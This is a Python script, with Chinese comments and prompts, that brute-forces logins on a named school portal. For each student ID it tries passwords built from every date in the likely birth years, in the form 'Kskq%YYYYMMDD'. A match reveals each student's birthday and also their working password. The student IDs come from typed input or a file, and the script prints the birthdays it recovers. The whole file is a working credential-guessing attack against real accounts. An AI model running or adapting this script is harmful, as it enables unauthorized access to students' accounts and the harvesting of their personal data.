import requests
import datetime

def login(username, password):
    url = "http://portal.kcisec.com/login/Account/LogInCheck"
    params = {
        "UserId": username,
        "Password": password,
        "Mode": "tuberculosis",
    }
    response = requests.get(url, params=params)
    return "login_ok" in response.text or "Account/ShowPage" in response.text

def find_birthday(username):
    prefix = int(username[:2])
    today = datetime.datetime.today()

    # 定义搜索顺序
    search_order = [7, 8, 6, 9]
    for x in search_order:
        start_date = datetime.datetime(prefix - x + 2000, 9, 1)
        end_date = datetime.datetime(prefix - (x - 1) + 2000, 9, 1)
        for i in range((end_date - start_date).days):
            date = start_date + datetime.timedelta(days=i)
            password = f"Kskq%{date.strftime('%Y%m%d')}"
            if login(username, password):
                return date.strftime('%Y%m%d')  # 直接返回找到的生日

    print(f"学号{username}的生日查询失败。该生不存在或生日留级超过二级，需手动确认。")
    return None  # 返回None表示未找到

def read_txt_file(file_path):
    with open(file_path, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f.readlines()]

def main():
    file_path = 'login.txt'
    numbers = ['']
    
    res = input("请输入你想要哪种搜索方式。1手动输入 2列表输入\n")
    if res == '2':
        student_numbers = numbers
    elif res == '1':
        student_numbers = [input("只可单人。请输入学号：")]
    else:
        student_numbers = read_txt_file(file_path)

    # 收集所有生日
    all_birthdays = []
    for student_number in student_numbers:
        birthday = find_birthday(student_number)
        if birthday:
            all_birthdays.append(birthday)

    # 输出生日列表
    if all_birthdays:
        birthday_list_str = '\n'.join(all_birthdays)
        print(birthday_list_str)
    else:
        print("未找到任何生日信息。")

if __name__ == "__main__":
    main()
